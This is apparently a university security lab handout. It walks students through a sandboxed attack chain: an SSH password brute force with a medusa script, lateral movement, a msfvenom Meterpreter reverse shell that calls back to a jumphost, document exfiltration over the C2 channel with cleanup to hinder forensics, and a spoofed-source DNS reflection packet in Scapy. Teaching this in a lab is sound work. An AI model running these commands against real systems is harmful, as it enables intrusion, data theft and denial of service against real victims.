# PB177 – Resource development, intial access, execution, discovery, lateral movement, collection, command and control, exfiltration, impact

[[_TOC_]]

## Learning objectives

At the end of this lab session, you will be able to:
- create a wordlist and run attack on SSH password-based authentication,
- discover active accounts and make a lateral movement,
- install Metasploit Framework at a future command and control (C2),
- setup a C2 channel using Metasploit Framework,
- use C2 for collection and exfiltration of target data,
- capture and analyze C2 traffic using tcpdump and Wireshark,
- run a trivial DNS reflection attack and analyze generated packets.

<details>
<summary>What is discovery?</summary> 

Techniques that adversaries use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act.\
See [MITRE ATT&CK® Matrix for Enterprise](https://attack.mitre.org/tactics/TA0007/) for more info.

</details>

<details>
<summary>What is lateral movement?</summary> 

Techniques that adversaries that adversaries use to enter and control remote systems on a network. Following through on their primary objective often requires exploring the network to find their target and subsequently gaining access to it. Reaching their objective often involves pivoting through multiple systems and accounts to gain.\
See [MITRE ATT&CK® Matrix for Enterprise](https://attack.mitre.org/tactics/TA0008/) for more info.

</details>

<details>
<summary>What is collection?</summary> 

Techniques that adversaries use to gather information and the sources information is collected from that are relevant to following through on the adversary's objectives.\
See [MITRE ATT&CK® Matrix for Enterprise](https://attack.mitre.org/tactics/TA0009/) for more info.

</details>

<details>
<summary>What is command and control?</summary> 

Techniques that adversaries use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection.\
See [MITRE ATT&CK® Matrix for Enterprise](https://attack.mitre.org/tactics/TA0011/) for more info.

</details>

<details>
<summary>What is exfiltration?</summary> 

Techniques for stealing data from the target network. Once adversaries have collected data, they often package it to avoid detection while removing it.\
See [MITRE ATT&CK® Matrix for Enterprise](https://attack.mitre.org/tactics/TA0010/) for more info.

</details>

<details>
<summary>What is impact?</summary> 

Techniques that adversaries use to disrupt availability or compromise integrity by manipulating business and operational processes.\
See [MITRE ATT&CK® Matrix for Enterprise](https://attack.mitre.org/tactics/TA0040/) for more info.

</details>

## Start the sandbox

1. Update the repo by running `git pull` in `labs` directory. Go to `4` directory.
1. Login to get access to Podman images: `podman login gitlab.fi.muni.cz:5050`.
1. **Run `podman-compose pull` to download images used in this lab.**
1. Run `podman-compose up -d`.
1. [Check you can access Kali container using terminal and RDP](../1/index.md#start-the-sandbox). This lab uses two containers, `podman-compose ps -q | wc -l` should display `6`.

## Sandbox Topology

During the lab, use pen and paper to document the network topology as you discover hosts and services within the network. For each host, record the IP address, hostname, username(s), password(s), service(s), and any other important information needed to navigate within the sandbox. You will be required to present the completed topology at the end of the lab.

## Attack

### Task: Brute Force: Password Guessing

[T1110.001](https://attack.mitre.org/techniques/T1110/001/)

Your target is a company with a public-facing host with IP 10.0.128.2.

Use `ncrack`, `medusa`, or `hydra` at `attacker` to guess password for authentication of one of company users via SSH. Use a [list of employees](./employees.md) and leverage rumors that users may still use their default credentials.

 You have been told that the username is their surname in small letters and without diacritics, and the password is the first name without diacritics and a number from 0 to 9, and the first letter is the capital. For instance, Roman Havel could have the username `havel` and password `Roman0`.

<details>

<summary>
Solution
</summary>

Create an employees.txt file on the attacker's machine and convert it to ASCII.

```
# cat employees.txt | iconv -f utf-8 -t ascii//TRANSLIT > employees-new.txt
# mv employees-new.txt employees.txt
```

Perform a brute-force attack to guess the user's password using the script and the Medusa tool.

* You can use the -t parameter to set the number of concurrent login attempts, which will speed up the brute-forcing process.

```
#/bin/sh

while read p; do

	password=$(echo $p | cut -d' ' -f 1)
	username=$(echo $p | cut -d' ' -f 2 | tr '[:upper:]' '[:lower:]')

	> wordlist.txt
	for i in $(seq 0 9);
	do
		echo "$password$i" >> wordlist.txt
	done

	medusa -t 4 -b -h 10.0.128.2 -u $username -P wordlist.txt -M ssh

done < employees.txt
```

Passwords found using the Medusa tool.

```
ACCOUNT CHECK: [ssh] Host: 10.0.128.2 (1 of 1, 0 complete) User: novak (1 of 1, 0 complete) Password: Martin1 (2 of 10 complete)
ACCOUNT FOUND: [ssh] Host: 10.0.128.2 User: novak Password: Martin1 [SUCCESS]

ACCOUNT CHECK: [ssh] Host: 10.0.128.2 (1 of 1, 0 complete) User: ruzicka (1 of 1, 0 complete) Password: Michal1 (1 of 10 complete)
ACCOUNT FOUND: [ssh] Host: 10.0.128.2 User: ruzicka Password: Michal1 [SUCCESS]
```

</details>

### Task: Account Discovery

[T1087](https://attack.mitre.org/techniques/T1087/)

Once you are logged in to the target via SSH, start with exploring the system.

You might check MOTD and run LinPeas as [in the previous lab](../3/index.md#task-exploitation-for-privilege-escalation) to determine whether the system is vulnerable to privilege escalation. It is not. But it is crucial for your ultimate goal: exfiltrating data from the desktop of the Head of IT.

List other users who have account at the same host.

<details>
<summary>
Solution
</summary>

* As `novak`, you can display `/etc/passwd`.
* There are three more users matching names at the [employees' list](./employees.md).

</details>

### Task: Log Enumeration

[T1654](https://attack.mitre.org/techniques/T1654/)

Find out what the target user did and use this information for getting access to another host in the network. 

<details>
<summary>
Solution
</summary>

* As `novak` you cannot access system logs in `/var/log`.
* You can view only your own shell history in `~/.bash_history`.
* Use the `history` command and you can see a host unkwown to you.

</details>

### Task: Remote Services and Valid Accounts

[T1021](https://attack.mitre.org/techniques/T1021/) and [T1078](https://attack.mitre.org/techniques/T1078).

Try accessing the discovered host using credentials you likely already know.

<details>
<summary>
Solution and follow-up task
</summary>

* `ssh novak@10.0.129.2`
* Can you connect to 10.0.129.2 from `attacker`? If not, why do you think?

</details>

### Task: Create, deploy and use a reverse shell

[T1608](https://attack.mitre.org/techniques/T1608/), [T0159](https://attack.mitre.org/techniques/T1059/), [T1071.001](https://attack.mitre.org/techniques/T1071/001/)

You can use an ordinary SSH session to access the target but you need to set up BASH history to hide commands you will execute. Another option is spawn a shell, which might be executed after booting the system or reguarly in a predefined period (see [the previous lab](../3/index.md#task-scheduled-taskjob-cron)).

Use Metasploit to create and execute a binary providing a reverse shell.

Use a *jumphost* as a target of the shell. The jumphost (proxy) enables you to hide your network location, i.e. your `attacker` machine IP address. You have already compromised a host and now you will use it.\
The jumphost has IP `10.0.10.22`, username and password is `ubuntu`.

First, install the Metasploit framework on the jumphost. Be prepared for potential issues during the installation process, as not everything may run smoothly; you may need to troubleshoot and resolve some problems along the way.

<details>
<summary>
Solution
</summary>

* Follow the [Metasploit documentation](https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html#installing-metasploit-on-linux--macos).
* The `msfinstall` script outputs `gpg: not found`. Install the utility by `sudo apt install gpg`.
* Start `msfconsole`.
* Answer `yes` to a question on the setup of a new database.

</details>

Generate a Meterpreter reverse shell binary using [`msfvenom`](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html) and implant it at the target machine in the 10.0.129.0/24 network.

When choosing a payload, use a protocol, which is allowed for outgoing and incomming traffic from and to the target.

<details>
<summary>
Solution
</summary>

* Start with discovering whether you can connect back from 10.0.129.2 (desktop) to your jump host, using a command such as `curl`.
* The 10.0.129.2 host runs firewall so you can use only a few ports to establish outgoing connections.
* Once you discover a port you can use, follow the [msfvenom documentation](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html).
* List available payloads using `msfvenom -l payloads` and choose the most suitable one, i. e. matching platform (`linux`), CPU architecture (`x86`, see host's Message of the Day), shell (`meterpreter`), and communication protocol (`http`): `linux/x86/meterpreter_reverse_http`.
* List available executable formats using `msfvenom -l formats` and choose the most suitable one, i. e. `elf`.
* Run `msfvenom` with variables set to the destination for your shell, i. e. your jumphost, and to create a binary named `test`: `msfvenom LHOST=10.0.10.22 LPORT=80 -p linux/x86/meterpreter_reverse_http -f elf -o test`

</details>

Set up a listener at the jumphost using `msfconsole`.\
Transfer the created binary to the target host and execute it.

<details>
<summary>
Solution
</summary>

* Start `msfconsole` as `root` since you will set the listener for privileged port 80: `sudo msfconsole`.
* Run the following Metasploit commands:
```
use exploit/multi/handler
set PAYLOAD linux/x86/meterpreter_reverse_http
set LHOST eth0
set LPORT 80
run
```
* You should get a message `Started HTTP reverse handler on http://10.0.10.22:80`

* Let the msfconsole open and start a new session at `attacker` and connect to the jumphost.
* Copy the created binary (`test`) from jumphost to the target via the compromised server: `scp test novak@10.0.128.2:/tmp` at jumphost and then `scp /tmp/test novak@10.0.129.2:/tmp` at server.
* Do not forget to delete `test` at the server to make it more difficult for a post-compromise analysis.
* Execute the binary at the target. You should see `[*] Meterpreter session 1 opened` at the jumphost.

</details>

### Task: Search and collect sensitive documents

[T1059](https://attack.mitre.org/techniques/T1059/) and [T1560](https://attack.mitre.org/techniques/T1560/)

Now you can command and control the host directly from the jumphost without SSH.

Use Meterpreter to search for meeting minutes and archive them for exfiltration.

<details>
<summary>
Solution
</summary>

* `search -f *.docx` yields two interesting documents.
* `/home/novak/Documents` contains only the two documents.
* Use Meterpreter `shell` command to archive the documents using your favourite utility, such as `tar cf data.tar *`.

</details>

### Task: Exfiltration Over C2 Channel

[T1041](https://attack.mitre.org/techniques/T1041/)

Use Meterpreter to download the collected data. 

<details>
<summary>
Solution
</summary>

* Use Meterpreter `download` command to transfer the archive to the jumphost: `download data.tar`
* Remove the archive from the target: `rm data.tar`.

</details>

Finally, open the document and find out the estimated budget for procurement of laptops.

<details>
<summary>
Solution
</summary>

* Transfer the archive from jumphost to your attacker with GUI.
* Extract the archive and open Word documents. You may need to install additional software at `attacker`, such as docx2txt or LibreOffice.
* File `Meeting Minutes - Oct 30, 2024.docx` contains "Preliminary budget estimate".

</details>

Do **not** exit Meterpreter session, we will use it in the further task.

### Task: Network Denial of Service: Reflection Amplification

[T1498.002](https://attack.mitre.org/techniques/T1498/002/)

Abuse a DNS server running in the network of the target organization for a reflection attack of another target.

The DNS server runs at IP 10.0.128.3. The target has IP 10.0.33.50.

First, prepare the target. Run a simple UDP listerer there:
* Connect directly to target using `podman compose exec target bash`.
* Listen at UDP port 53: `nc -u -l -p 53`.

Then switch to `attacker`.

Check you can send packets from `attacker` to `target`: 
* run `echo test | nc -u 10.0.33.50 53` at `attacker`,
* you should see `test` at `target`,
* exit `nc` at `attacker` (<kbd>Ctrl</kbd>+<kbd>C</kbd>),
* do exit and start again `nc` at `target`.

Use [Scapy](https://scapy.net), an interactive packet manipulation library written in Python, to send a DNS request with forged source address to run a reflection attack targeting 10.0.33.50.

<details>
<summary>
Solution
</summary>

* Run Python interpreter at `attacker`: `python`.
* Import `scapy`: `from scapy.all import *`
* Construct `send` command: `send(IP(dst="10.0.128.3",src="10.0.33.50")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="localhost")))`
  * `IP()` creates an IP packet with source and destination IP addresses: destination is the DNS server, **the source IP is the IP of the target**,
  * `UDP()` creates a UDP datagram with the destination port 53,
  * `DNS()` creates a DNS request for `localhost`.
* Scapy outputs `Sent 1 packets.`
* Switch to `target`. You can see some bytes received (`localhost` is among these bytes).

</details>

Run `tcpdump` at `target` to see the generated traffic.

<details>
<summary>
Solution
</summary>

* Run `tcpdump -n -A 'port 53'` at `target`.
* Send again the packet from `attacker`. 
* `tcpdump` should display `IP 10.0.128.3.53 > 10.0.33.50.53: 0* 1/0/0 A 127.0.0.1 (43)`, i. e. answer from the DNS server to a request sent by attacker, not the target.
* `attacker` IP is not seen anymore.
* How can this type of attack be prevented?

</details>

## Traffic analysis

### Task: Inspect C2 traffic

Install `tcpdump` at the jumphost and capture C2 traffic between the target and jumphost at TCP port 80.

Run `ls` command in Meterpreter and then `download` again.

Stop the packet capture and transfer the trace to `attacker` to view it using Wireshark in GUI.

<details>
<summary>
Solution
</summary>

* Install `tcpdump`: `sudo apt update && sudo apt install tcpdump`
* Start the capture: `sudo tcpdump 'port 80' -w capture.pcap`.
* Run the Meterpreter commands.
* Stop the capture by <kbd>Ctrl</kbd>+<kbd>C</kbd>.
* Check the trace contains packets: `tcpdump -r capture.pcap`.
* Copy the trace to `attacker`: `scp ubuntu@10.0.10.22:~/capture.pcap .` at attacker.

</details>

Open the packet trace in Wireshark and inspect traffic.\
Can you find packets carrying the downloaded files?

<details>
<summary>
Solution
</summary>

The downloaded files are transported in biggest packets in the trace.\
Use Length column and order the packets by Lenght. There should be packets longer than 1000 bytes.

</details>

## End of the lab

If you finish all tasks, stop the sandbox using `podman-compose down`.
